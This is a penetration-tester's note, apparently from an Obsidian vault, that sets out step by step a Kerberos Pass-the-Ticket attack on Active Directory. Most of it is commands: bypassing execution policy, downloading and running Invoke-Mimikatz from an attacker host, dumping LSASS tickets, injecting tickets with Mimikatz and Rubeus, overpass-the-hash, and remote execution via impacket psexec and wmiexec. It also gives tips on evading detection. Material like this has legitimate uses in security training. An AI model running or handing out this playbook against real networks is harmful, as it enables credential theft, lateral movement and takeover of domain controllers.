---
title: Pass the Ticket (PtT)
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
Stole kerberos tickets to authenticate to resources (shares, computers...) as a user without having to compromise the password.
1. **Without administrative privileges**: we can obtain the TGT and all TGS for the current user using a technique called fake delegation
2. **With administrative privileges**: we can dump the LSASS process and obtain all TGTs and TGS tickets cached on the system.

> [!Info]
> TGS tickets are exportable and can be used across sessions and systems while TGT tickets are tied to a specific session.

Steps (for second option):
1. Load PowerView and find machines within the current AD Domain where the current user has local administrator access:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1

PS> whoami
PS> hostname
PS> Find-LocalAdminAccess (find machine within the current AD Domain where the current user has local administrator access)

PS> Enter-PSSession FQDN_SYSTEM (PSRemote into systems)
PS [remote]> whoami /privs (we should have admin privileges)
```

2. Dump all tickets from memory:
```powershell
*Create an HFS server and upload Invoke-Mimikatz.ps1*
PS [remote]> iex (New-Object Net-WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1')

PS [remote]> Invoke-Mimikatz.ps1 -Command '"sekurlsa::tickets /export"' (export TGS tickets)
PS [remote]> dir *.kirbi
```

Select the `USER@TARGET.kirbi` ticket we are interested in.

3. Use the tickets to access resources and other systems:
```powershell
PS [remote]> Invoke-Mimikatz -Command '"kerberos::ptt FULL_TICKET_NAME.kirbi"' (introduce the extracted ticket into our current PS session)
Parameters:
FULL_TICKE_NAME: ticket name for example [...]-...maintainer-krbtgt-FQDN (try maintainer@krbtgt to access the DC)

PS [remote]> klist (list current tickets. We should have the new ticket loaded)
NOTE: check the renew time for persistence

Invoke Powerview to check the DC FQDN and access the DC using the extracted ticket:
PS> . .\PowerView.ps1
PS> Get-Domain (check DC FQDN)
PS [remote]> ls \\DC_FQDN\c$ (check if we can access the C drive from the DC)
```

4. Access the target leveraging the ticket:
```powershell
If the ticket is CIFS, we can access the target shares:

1. Enumerate available shares:
C:\> net view \\TARGET_HOSTNAME # CMD
PS C:\> Get-SmbShare -CimSession TARGET_HOSTNAME # PSH
$ crackmapexec smb TARGET_HOSTNAME -k --shares # Linux

2. Enumerate and access the shares:
PS C:\> ls \\TARGET_HOSTNAME\SHARE\
PS C:\> cat \\TARGET_HOSTNAME\SHARE\file
...
```

---

# PtT with Rubeus (modern alternative to Mimikatz)

Rubeus is usually preferred on modern, EDR-heavy targets. It can dump, request and inject tickets in one tool.
```powershell
# Dump all tickets currently cached in memory (needs admin for other users' tickets)
PS C:\> .\Rubeus.exe dump /nowrap

# Inject a base64 .kirbi ticket into the CURRENT logon session (no admin needed for /ptt)
PS C:\> .\Rubeus.exe ptt /ticket:<BASE64_KIRBI>
PS C:\> .\Rubeus.exe ptt /ticket:ticket.kirbi

# Ask for a fresh TGT from a hash/AES key and inject it (overpass-the-hash / pass-the-key)
PS C:\> .\Rubeus.exe asktgt /user:USER /rc4:<NTLM_HASH> /ptt
PS C:\> .\Rubeus.exe asktgt /user:USER /aes256:<AES256_KEY> /ptt   # AES avoids RC4 downgrade detections

# Confirm the ticket is loaded
PS C:\> klist
```

> [!Tip]
> Prefer `/aes256` over `/rc4` when you have the AES key — RC4 (etype 23) Kerberos requests are a common detection signature for pass-the-key attacks.

# PtT from Linux (impacket / ccache)

On Linux the ticket lives in a **ccache** file and is selected via the `KRB5CCNAME` environment variable.
```bash
# Convert a Windows .kirbi to a Linux ccache (impacket)
$ impacket-ticketConverter ticket.kirbi ticket.ccache

# Point the environment at the ccache and use -k / -no-pass with any impacket tool
$ export KRB5CCNAME=$(pwd)/ticket.ccache
$ klist                                   # verify (from krb5-user)
$ impacket-psexec -k -no-pass TARGET_FQDN
$ impacket-wmiexec -k -no-pass TARGET_FQDN
$ crackmapexec smb TARGET_FQDN -k --shares
```

> [!Warning]
> Kerberos is time-sensitive. If tools fail with `KRB_AP_ERR_SKEW`, sync your clock to the DC first — see [[Clock Skew]]. Always reference hosts by **FQDN**, never by IP, or Kerberos falls back to NTLM and the ticket is ignored.

---

# Related notes
- [[Pass the Hash (PtH)]] — when you have the NTLM hash instead of a ticket
- [[Kerberoasting]] — request and crack service (TGS) tickets
- [[AS-REP Roasting]] — obtain crackable tickets for users without pre-auth
- [[Silver Ticket]] — forge a TGS for a specific service
- [[Kerberos on Linux]] — deeper ccache/keytab workflow on Linux
- [[Clock Skew]] — fix `KRB_AP_ERR_SKEW` before any Kerberos attack
- [[Enter-PSSession]] — remoting into hosts once a ticket is loaded
- [[AD Enumeration with PowerView]] — finding admin access and the DC FQDN
